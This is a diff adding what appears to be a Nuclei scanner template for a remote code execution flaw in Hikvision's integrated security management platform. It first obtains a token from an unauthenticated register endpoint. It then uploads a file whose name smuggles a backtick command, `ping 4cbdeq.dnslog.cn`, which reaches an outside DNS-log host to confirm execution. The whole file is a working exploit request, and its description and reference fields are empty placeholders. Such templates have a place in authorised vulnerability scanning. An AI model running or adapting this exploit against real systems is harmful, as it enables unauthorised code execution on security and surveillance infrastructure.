@@ -1,0 +1,53 @@
+id: Hikvision_31
+
+info:
+  name: 海康威视综合安防管理平台productFile远程代码执行
+  author: Douliyoutang
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: Hikvision
+  
+flow: http(1) && http(2)
+
+
+http:
+  - raw:
+      - |+
+        GET /iac/iasService/v1/register HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+        
+    matchers:
+      - type: word
+        internal: true
+        part: header
+        words:
+          - 'Token'
+        
+    extractors:
+      - type: kval # type of the extractor
+        name: Token
+        internal: true
+        kval:
+          - Token
+
+  - raw:
+      - |
+        POST /svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1 HTTP/1.1
+        Host: {{Hostname}}
+        Token: {{Token}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+        Content-Length: 346
+
+        -----------------------------142851345723692939351758052805
+        Content-Disposition: form-data; name="file"; filename="`ping 4cbdeq.dnslog.cn`.zip"
+        Content-Type: application/zip
+
+        123
+        -----------------------------142851345723692939351758052805--
